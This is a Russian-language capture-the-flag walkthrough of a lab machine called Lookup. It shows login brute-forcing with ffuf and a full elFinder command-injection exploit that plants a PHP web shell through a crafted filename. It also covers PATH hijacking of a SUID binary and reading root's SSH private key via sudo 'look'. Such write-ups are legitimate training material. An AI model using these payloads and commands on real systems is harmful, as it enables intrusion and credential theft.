# Lookup

### Необходимые навыки

- Обнаружение информационного раскрытия через разницу в сообщениях об ошибках (username enumeration)
- Брутфорс веб-форм через Burp Suite и ffuf
- Работа с эксплойтами (elFinder RCE через Metasploit)
- Разбор декомпилированного псевдокода на C (Ghidra)
- PATH-инъекция для повышения привилегий
- Эксплуатация `look` через sudo (GTFOBins)

---

### Получение шелла

Скан портов ничего неожиданного не даёт — открыты только 22 (SSH) и 80 (HTTP). Перехожу на сайт и вижу стандартную форму логина. Проверяю на SQLi, фаззю директории — без результата.

Начинаю перебирать логины вручную и замечаю кое-что интересное: при вводе `admin` сервер отвечает `wrong password`, тогда как для несуществующих пользователей — `wrong username or password`. Это классическое информационное раскрытие: сервер косвенно подтверждает существование аккаунта. Раз пользователь `admin` существует — можно целенаправленно брутфорсить пароли именно для него.

Перехватываю запрос через Burp, подставляю `FUZZ` в поле пароля и запускаю ffuf:

```
ffuf -request req.txt -request-proto http -w rockyou.txt -fs <длина_стандартного_ответа>
```

На одном из паролей ответ отличается по размеру, однако войти под `admin` с ним не получается — вероятно, пароль принадлежит другому пользователю. Применяю тот же приём для логинов: ffuf находит пользователя `jose`. Связка `jose` + найденный ранее пароль срабатывает.

После входа происходит редирект на `files.lookup.thm` — добавляю его в `/etc/hosts` и попадаю в файловый менеджер. Ничего ценного в файлах нет, зато виден сервис с конкретной версией:

<img width="489" height="115" alt="image" src="https://github.com/user-attachments/assets/35fd6ce0-7cae-47ac-a914-67a9f6afb517" />

На эту версию elFinder существует готовый модуль в Metasploit. Выбираю его и заполняю опции:

```
Name       Current Setting  Required  Description   
----       ---------------  --------  -----------   
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS     ip               yes       The target host(s)
RPORT      80               yes       The target port (TCP)   
SSL        false            no        Negotiate SSL/TLS for outgoing connections   
TARGETURI  /elFinder/       yes       The base path to elFinder   
VHOST      files.lookup.thm no        HTTP server virtual host
```

#### Разбор эксплойта

```python
import requests
import json
import sys

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'

def usage():
    if len(sys.argv) != 2:
        print "Usage: python exploit.py [URL]"
        sys.exit(0)

def upload(url, payload):
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
    data = {"reqid" : "1693222c439f4", "cmd" : "upload", "target" : "l1_Lw", "mtime[]" : "1497726174"}
    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)
    j = json.loads(r.text)
    return j['added'][0]['hash']

def imgRotate(url, hash):
    r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))
    return r.text

def shell(url):
    r = requests.get("%s/php/SecSignal.php" % url)
    if r.status_code == 200:
       print "[+] Pwned! :)"
       print "[+] Getting the shell..."
       while 1:
           try:
               input = raw_input("$ ")
               r = requests.get("%s/php/SecSignal.php?c=%s" % (url, input))
               print r.text
           except KeyboardInterrupt:
               sys.exit("\nBye kaker!")
    else:
        print "[*] The site seems not to be vulnerable :("

def main():
    usage()
    url = sys.argv[1]
    print "[*] Uploading the malicious image..."
    hash = upload(url, payload)
    print "[*] Running the payload..."
    imgRotate(url, hash)
    shell(url)

if __name__ == "__main__":
    main()
```

Механика работает в четыре этапа.

**1. Вредоносный payload в имени файла**

```python
payload = 'SecSignal.jpg;echo 3c3f... | xxd -r -p > SecSignal.php;echo SecSignal.jpg'
```

Имя файла сформировано как цепочка shell-команд, разделённых `;`. Когда сервер передаёт это имя системной утилите обработки изображений (ImageMagick или аналогу), оболочка разбивает строку по `;` и выполняет каждый фрагмент как отдельную команду. `xxd -r -p` декодирует hex-строку в текст; результат — файл `SecSignal.php` со следующим содержимым:
```php
<?php system($_GET["c"]); ?>
```
Финальный `echo SecSignal.jpg` нужен, чтобы скрипт обработки не вернул ошибку и не обнаружил подмену.

**2. Загрузка файла и получение хэша (функция `upload`)**

POST-запрос к `connector.minimal.php` — стандартному бэкенду elFinder. Сервер сохраняет файл, не проверяя имя, и возвращает внутренний идентификатор (`hash`), необходимый для следующего шага.

**3. Триггер через поворот изображения (функция `imgRotate`)**

Запрос с параметрами `cmd=resize&mode=rotate` заставляет elFinder вызвать системную утилиту для обработки «изображения». Имя файла подставляется в командную строку без экранирования — оболочка выполняет встроенные команды, и `SecSignal.php` появляется на сервере.

**4. Интерактивный шелл (функция `shell`)**

Скрипт проверяет доступность `SecSignal.php` по HTTP (код 200) и запускает цикл: читает команды из stdin и отправляет их через GET-параметр `?c=...`.

Запускаю эксплойт, ловлю reverse shell.

---

### Взятие юзера

Оказываемся в системе с правами `www-data`. Загружаю LinPEAS и сразу нахожу подозрительный SUID-бинарник:

```
-rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SUID binary!)
```

Копирую на свою машину и анализирую в Ghidra:

```c
undefined8 main(void)
{
  int iVar1;
  FILE *pFVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  undefined1 local_128 [64];
  char local_e8 [112];
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("[!] Running \'id\' command to extract the username and user ID (UID)");
  snprintf(local_e8,100,"id");
  pFVar2 = popen(local_e8,"r");
  if (pFVar2 == (FILE *)0x0) {
    perror("[-] Error executing id command\n");
    uVar3 = 1;
  }
  else {
    iVar1 = __isoc99_fscanf(pFVar2,"uid=%*u(%[^)])",local_128);
    if (iVar1 == 1) {
      printf("[!] ID: %s\n",local_128);
      pclose(pFVar2);
      snprintf(local_78,100,"/home/%s/.passwords",local_128);
      pFVar2 = fopen(local_78,"r");
      if (pFVar2 == (FILE *)0x0) {
        printf("[-] File /home/%s/.passwords not found\n",local_128);
        uVar3 = 0;
      }
      else {
        while( true ) {
          iVar1 = fgetc(pFVar2);
          if ((char)iVar1 == -1) break;
          putchar((int)(char)iVar1);
        }
        fclose(pFVar2);
        uVar3 = 0;
      }
    }
    else {
      perror("[-] Error reading username from id command\n");
      uVar3 = 1;
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
```

Логика бинарника: запустить `id`, извлечь имя пользователя из вывода и открыть файл `/home/<username>/.passwords`. Уязвимость в том, что `id` вызывается по **относительному** пути. Если у sudo не выставлен `env_reset` (проверяется через `sudo -V`), переменную PATH можно подменить, подсунув собственный исполняемый файл с именем `id`.

Создаю поддельный `id` в `/tmp`:

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
```

Запускаю `/usr/sbin/pwm` — бинарник вызывает наш скрипт, получает имя `think` и выводит содержимое `/home/think/.passwords`. Забираем пароль и заходим по SSH.

---

### Повышение привилегий до root

```bash
sudo -l
```

Разрешено запускать `/usr/bin/look` с правами root без пароля. `look` — утилита для поиска строк с заданным префиксом; при пустом префиксе она выводит весь файл целиком. Читаем приватный SSH-ключ root:

```bash
sudo /usr/bin/look '' /root/.ssh/id_rsa
```

Сохраняем ключ, выставляем нужные права и подключаемся:

```bash
chmod 600 rsa_id
ssh -i rsa_id root@<ip>
```
